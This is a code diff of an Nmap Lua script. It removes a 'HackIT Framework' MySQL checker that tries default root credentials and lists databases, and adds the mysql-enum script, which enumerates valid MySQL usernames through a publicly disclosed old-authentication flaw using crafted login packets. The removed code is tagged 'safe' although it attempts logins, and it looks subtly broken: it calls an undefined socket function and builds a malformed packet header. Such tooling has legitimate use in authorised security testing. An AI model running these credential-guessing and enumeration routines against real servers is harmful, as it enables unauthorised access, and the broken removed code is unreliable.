@@ -1,139 +1,113 @@
-local stdnse = require "stdnse"
+local brute = require "brute"
+local creds = require "creds"
+local mysql = require "mysql"
 local nmap = require "nmap"
 local shortport = require "shortport"
+local stdnse = require "stdnse"
+local string = require "string"
 
+local openssl = stdnse.silent_require "openssl"
 
+description = [[
+Performs valid-user enumeration against MySQL server using a bug
+discovered and published by Kingcope
+(http://seclists.org/fulldisclosure/2012/Dec/9).
 
--- Fast-path bindings for the stdlib and nmap API used by this script.
--- Kept strict-mode safe: every name below is a declared local.
-local format = string.format
-local lower = string.lower
-local upper = string.upper
-local byte = string.byte
-local sub = string.sub
-local match = string.match
-local gmatch = string.gmatch
-local gsub = string.gsub
-local find = string.find
-local rep = string.rep
-local char = string.char
-local concat = table.concat
-local insert = table.insert
-local remove = table.remove
-local sort = table.sort
-local move = table.move
-local tostring = tostring
-local tonumber = tonumber
-local type = type
-local pcall = pcall
-local pairs = pairs
-local ipairs = ipairs
-local unpack = table.unpack
-local setmetatable = setmetatable
-local getmetatable = getmetatable
-local error = error
-local select = select
+Server version 5.x are susceptible to an user enumeration
+attack due to different messages during login when using
+old authentication mechanism from versions 4.x and earlier.
 
-local clock = nmap.clock
-local msleep = nmap.msleep
+]]
 
--- stdnse.sleep / stdnse.strsplit are not present in every NSE runtime.
-local sleep = function(seconds)
-    return nmap.msleep(math.max(0, math.floor(seconds * 1000)))
-end
+---
+-- @usage
+-- nmap --script=mysql-enum <target>
+--
+-- @output
+-- PORT     STATE SERVICE REASON
+-- 3306/tcp open  mysql   syn-ack
+-- | mysql-enum:
+-- |   Accounts
+-- |     admin:<empty> - Valid credentials
+-- |     test:<empty> - Valid credentials
+-- |     test_mysql:<empty> - Valid credentials
+-- |   Statistics
+-- |_    Performed 11 guesses in 1 seconds, average tps: 11
+--
+-- @args mysql-enum.timeout socket timeout for connecting to MySQL (default 5s)
 
-local strsplit = function(sep, str, max)
-    local out, pos, n = {}, 1, 0
-    if str == nil then return out end
-    while true do
-        if max and n >= max - 1 then
-            out[#out + 1] = sub(str, pos)
-            return out
-        end
-        local s, e = find(str, sep, pos)
-        if not s then
-            out[#out + 1] = sub(str, pos)
-            return out
-        end
-        if e < pos then e = pos end
-        out[#out + 1] = sub(str, pos, s - 1)
-        pos = e + 1
-        n = n + 1
-        if pos > #str then
-            out[#out + 1] = ""
-            return out
-        end
+author = "Aleksandar Nikolic"
+license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
+categories = {"intrusive", "brute"}
+
+portrule = shortport.port_or_service(3306, "mysql")
+
+local arg_timeout = stdnse.parse_timespec(stdnse.get_script_args(SCRIPT_NAME .. ".timeout"))
+arg_timeout = (arg_timeout or 5) * 1000
+
+Driver = {
+
+  new = function(self, host, port)
+    local o = {}
+    setmetatable(o, self)
+    self.__index = self
+    o.host = host
+    o.port = port
+    return o
+  end,
+
+  connect = function( self )
+    self.socket = nmap.new_socket()
+    local status, err = self.socket:connect(self.host, self.port)
+    self.socket:set_timeout(arg_timeout)
+    if(not(status)) then
+      return false, brute.Error:new( "Couldn't connect to host: " .. err )
     end
-end
+    return true
+  end,
 
-local format_output = stdnse.format_output
-local output_table = stdnse.output_table
+  login = function (self, user, pass) -- pass is actually the username we want to try
+    local status, response = mysql.receiveGreeting(self.socket)
+    if(not(status)) then
+      if string.find(response,"is blocked because of many connection errors") then
+        local err = brute.Error:new( response )
+        err:setAbort( true )
+        return false, err
+      end
+      return false,brute.Error:new(response)
+    end
+    stdnse.debug1( "Trying %s ...", pass)
+    local auth_string = stdnse.fromhex("0000018d00000000") .. pass .. stdnse.fromhex("00504e5f5155454d4500"); -- old authentication method
+    local err
+    status, err = self.socket:send(string.pack("b",#auth_string-3) .. auth_string) --send initial auth
+    status, response = self.socket:receive_bytes(0)
+    if not status then
+      return false,brute.Error:new( "Incorrect username" )
+    end
+    if string.find(response,"Access denied for user") == nil then
+      -- found it
+      return true, creds.Account:new( pass, nil, creds.State.VALID)
+    else
+      return false,brute.Error:new( "Incorrect username" )
+    end
+  end,
 
-description = [[Authenticates to a MySQL server and issues the SHOW DATABASES command to enumerate all accessible databases on the server. Uses structured output with database list.]]
-author = "HackIT Framework"
-license = "HackIT Framework — Internal Use Only"
-categories = {"safe", "discovery"}
+  disconnect = function( self )
+    self.socket:close()
+    return true
+  end
 
-portrule = function(host, port) return port.protocol == "tcp" and port.state == "open" and (port.number == 3306 or port.service == "mysql") end
-
-local test_creds = {
-    {user = "root", pass = ""},
-    {user = "root", pass = "root"},
 }
 
-action = function(host, port)
-    for _, cred in ipairs(test_creds) do
-        local sock = new_socket()
-        sock:set_timeout(10000)
-        local ok, databases = pcall(function()
-            local status = sock:connect(host.ip, port)
-            if not status then return end
-            local banner = sock:receive_buf("", 5000)
-            if not banner then sock:close(); return end
-            local auth_suffix = char(0x00)
-            if cred.pass == "" then
-                auth_suffix = char(0x00) .. char(#cred.user) .. cred.user .. char(0x00)
-            else
-                auth_suffix = char(0x00) .. char(#cred.user) .. cred.user .. char(0x00) .. char(#cred.pass) .. cred.pass .. char(0x00)
-            end
-            local auth_payload = char(0x85, 0xa2, 0x1e, 0x00, 0x00, 0x00, 0x00, 0x40, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00) .. auth_suffix
-            sock:send(auth_payload)
-            local _, auth_resp = sock:receive_buf("", 5000)
-            if not auth_resp or byte(auth_resp, 5) ~= 0x00 then
-                sock:close()
-                return
-            end
-            local query = char(0x03, 0x00, 0x00, 0x00, 0x03) .. "SHOW DATABASES"
-            local qlen = #query
-            local header = char(0x00, 0x00, 0x00, 0x00, qlen % 256, math.floor(qlen / 256), 0x00, 0x00)
-            sock:send(header .. query)
-            local _, data = sock:receive_buf("", 5000)
-            sock:close()
-            if data and #data > 5 then
-                local dbs = {}
-                local skip = 5
-                while skip < #data do
-                    local col_len = byte(data, skip + 1)
-                    if col_len == 0 or col_len > 64 then break end
-                    local db_name = sub(data, skip + 2, skip + 1 + col_len)
-                    if db_name and #db_name > 0 and not match(db_name, "[%z%c]") then
-                        insert(dbs, db_name)
-                    end
-                    skip = skip + 1 + col_len + 1
-                end
-                return dbs
-            end
-        end)
-        if not ok then
-            pcall(function() sock:close() end)
-        end
-        if databases and #databases > 0 then
-            local result = output_table()
-            result.databases = databases
-            result.database_count = #databases
-            result.credentials_used = cred.user
-            return result
-        end
-    end
-    return format_output(false, "Could not enumerate databases")
+action = function( host, port )
+
+  local status, result
+  local engine = brute.Engine:new(Driver, host, port)
+  engine.options:setOption("passonly", true )
+  engine:setPasswordIterator(brute.usernames_iterator())
+  engine.options.script_name = SCRIPT_NAME
+  engine.options:setTitle("Valid usernames")
+  status, result = engine:start()
+
+  return result
 end
